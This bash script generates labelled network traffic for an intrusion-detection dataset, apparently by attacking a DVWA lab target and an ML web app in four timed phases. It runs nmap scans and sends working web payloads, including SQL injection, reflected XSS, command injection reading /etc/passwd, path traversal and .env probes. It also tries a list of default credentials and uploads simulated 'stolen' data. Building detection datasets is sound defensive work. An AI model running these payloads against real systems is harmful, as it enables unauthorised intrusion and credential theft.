#!/bin/bash
# Infiltration Attack — Web-based APT Simulation
# All traffic originates FROM attacker IP → victim, so labeler sees src_ip=attacker.
#
# Creates DISTINCTIVE flow signatures (all on few ports → window_size=30 works):
#   Phase 1 (15%): Targeted recon — scan 10 specific ports repeatedly (20+ times each)
#            → many short SYN flows to same dst_ports (distinctive vs random scan)
#   Phase 2 (35%): Web exploitation — DVWA attacks (SQLi, XSS, command injection)
#            → HTTP flows to port 8080 with abnormal request patterns
#   Phase 3 (25%): Credential stuffing — repeated login attempts on port 3000/8080
#            → many POST flows, short duration, uniform size per session
#   Phase 4 (25%): Data exfiltration — download large files, POST stolen data
#            → high reverseOctetTotalCount (server→attacker), large POST bodies
#
# Environment: TARGET_IP, DURATION (seconds), ATTACKER_IP
set -e

TARGET="${TARGET_IP:?TARGET_IP not set}"
DUR="${DURATION:-120}"
ATTACKER="${ATTACKER_IP:?ATTACKER_IP not set}"

echo "[Infiltration] Starting web-based APT simulation on $TARGET for ${DUR}s"
echo "[Infiltration] Attacker: $ATTACKER"

# ═══════════════════════════════════════════════════════════
# Phase 1: Targeted Reconnaissance (15% of duration)
# Scan a small set of ports MANY times → generates enough flows per session
# for window_size=30. Each (src_ip, dst_ip, dst_port) session gets 20+ flows.
# ═══════════════════════════════════════════════════════════
RECON_DUR=$((DUR * 15 / 100))
echo "[Infiltration] Phase 1: Targeted recon for ${RECON_DUR}s"
RECON_END=$(($(date +%s) + RECON_DUR))

RECON_PORTS="22,80,443,2222,3000,3306,5432,8080,8443,9000"

while [ "$(date +%s)" -lt "$RECON_END" ]; do
    # SYN scan the target ports — repeat to build flow count per session
    nmap -sS -T4 -p "$RECON_PORTS" --max-retries 3 -oN /dev/null "$TARGET" 2>/dev/null || true
    # Service version detection on open ports generates more traffic per port
    nmap -sV -T4 -p 3000,8080,2222 --max-retries 2 -oN /dev/null "$TARGET" 2>/dev/null || true
    sleep 0.5
done

echo "[Infiltration] Phase 1 complete"

# ═══════════════════════════════════════════════════════════
# Phase 2: Web Exploitation on DVWA (35% of duration)
# Simulate SQL Injection, XSS, command injection against DVWA:8080.
# All traffic from attacker → victim:8080 (single session key).
# ═══════════════════════════════════════════════════════════
EXPLOIT_DUR=$((DUR * 35 / 100))
echo "[Infiltration] Phase 2: Web exploitation for ${EXPLOIT_DUR}s"
EXPLOIT_END=$(($(date +%s) + EXPLOIT_DUR))

# Get DVWA session cookie
COOKIE_JAR="/tmp/dvwa_cookies_$$"
curl -s -c "$COOKIE_JAR" -o /dev/null "http://${TARGET}:8080/login.php" 2>/dev/null || true
# Login to DVWA
curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -o /dev/null \
    -d "username=admin&password=password&Login=Login" \
    "http://${TARGET}:8080/login.php" 2>/dev/null || true

while [ "$(date +%s)" -lt "$EXPLOIT_END" ]; do
    # SQL Injection attempts
    curl -s -b "$COOKIE_JAR" -o /dev/null -m 3 \
        "http://${TARGET}:8080/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit" 2>/dev/null &
    curl -s -b "$COOKIE_JAR" -o /dev/null -m 3 \
        "http://${TARGET}:8080/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--&Submit=Submit" 2>/dev/null &
    # XSS attempts
    curl -s -b "$COOKIE_JAR" -o /dev/null -m 3 \
        "http://${TARGET}:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E" 2>/dev/null &
    # Command injection
    curl -s -b "$COOKIE_JAR" -o /dev/null -m 3 \
        -d "ip=127.0.0.1;cat+/etc/passwd&Submit=Submit" \
        "http://${TARGET}:8080/vulnerabilities/exec/" 2>/dev/null &
    curl -s -b "$COOKIE_JAR" -o /dev/null -m 3 \
        -d "ip=127.0.0.1;whoami&Submit=Submit" \
        "http://${TARGET}:8080/vulnerabilities/exec/" 2>/dev/null &
    # File inclusion
    curl -s -b "$COOKIE_JAR" -o /dev/null -m 3 \
        "http://${TARGET}:8080/vulnerabilities/fi/?page=../../../../../../etc/passwd" 2>/dev/null &
    # Directory traversal on ML WebApp
    curl -s -o /dev/null -m 3 \
        "http://${TARGET}:3000/../../../etc/passwd" 2>/dev/null &
    curl -s -o /dev/null -m 3 \
        "http://${TARGET}:3000/api/admin" 2>/dev/null &

    wait
    sleep 0.3
done

rm -f "$COOKIE_JAR"
echo "[Infiltration] Phase 2 complete"

# ═══════════════════════════════════════════════════════════
# Phase 3: Credential Stuffing (25% of duration)
# Rapid login attempts on multiple services.
# Many POST flows to same port → fills sessions quickly.
# ═══════════════════════════════════════════════════════════
CRED_DUR=$((DUR * 25 / 100))
echo "[Infiltration] Phase 3: Credential stuffing for ${CRED_DUR}s"
CRED_END=$(($(date +%s) + CRED_DUR))

# Generate a wordlist for credential stuffing
WORDFILE="/tmp/creds_$$"
cat > "$WORDFILE" << 'EOF'
admin:admin
admin:password
admin:123456
root:root
root:toor
user:user
test:test
admin:admin123
manager:manager
admin:letmein
guest:guest
demo:demo
EOF

while [ "$(date +%s)" -lt "$CRED_END" ]; do
    # DVWA login stuffing
    while IFS=: read -r user pass; do
        curl -s -o /dev/null -m 2 \
            -d "username=${user}&password=${pass}&Login=Login" \
            "http://${TARGET}:8080/login.php" 2>/dev/null &
    done < "$WORDFILE"
    # ML WebApp login stuffing
    while IFS=: read -r user pass; do
        curl -s -o /dev/null -m 2 \
            -H "Content-Type: application/json" \
            -d "{\"username\":\"${user}\",\"password\":\"${pass}\"}" \
            "http://${TARGET}:3000/api/login" 2>/dev/null &
    done < "$WORDFILE"
    wait
    sleep 0.2
done

rm -f "$WORDFILE"
echo "[Infiltration] Phase 3 complete"

# ═══════════════════════════════════════════════════════════
# Phase 4: Data Exfiltration (25% of duration)
# Download large responses, POST "stolen" data to attacker-controlled paths.
# Distinctive: high reverseOctetTotalCount, large POST bodies.
# ═══════════════════════════════════════════════════════════
EXFIL_DUR=$((DUR * 25 / 100))
echo "[Infiltration] Phase 4: Data exfiltration for ${EXFIL_DUR}s"
EXFIL_END=$(($(date +%s) + EXFIL_DUR))

# Generate fake "stolen" data for exfiltration
dd if=/dev/urandom bs=10000 count=1 2>/dev/null | base64 > /tmp/exfil_data_$$.txt

while [ "$(date +%s)" -lt "$EXFIL_END" ]; do
    # Download large pages (simulates data scraping)
    curl -s -o /dev/null -m 5 "http://${TARGET}:8080/" 2>/dev/null &
    curl -s -o /dev/null -m 5 "http://${TARGET}:8080/phpinfo.php" 2>/dev/null &
    curl -s -o /dev/null -m 5 "http://${TARGET}:3000/" 2>/dev/null &
    # Exfiltrate data via POST (large payload = distinctive)
    curl -s -o /dev/null -m 5 -X POST \
        -d @/tmp/exfil_data_$$.txt \
        "http://${TARGET}:8080/vulnerabilities/upload/" 2>/dev/null &
    curl -s -o /dev/null -m 5 -X POST \
        -H "Content-Type: application/octet-stream" \
        -d @/tmp/exfil_data_$$.txt \
        "http://${TARGET}:3000/api/upload" 2>/dev/null &
    # Repeated access to sensitive endpoints
    curl -s -o /dev/null -m 3 "http://${TARGET}:8080/config/" 2>/dev/null &
    curl -s -o /dev/null -m 3 "http://${TARGET}:8080/.env" 2>/dev/null &
    curl -s -o /dev/null -m 3 "http://${TARGET}:3000/.env" 2>/dev/null &

    wait
    sleep 0.5
done

rm -f /tmp/exfil_data_$$.txt
echo "[Infiltration] Phase 4 complete"

echo "[Infiltration] Attack complete"
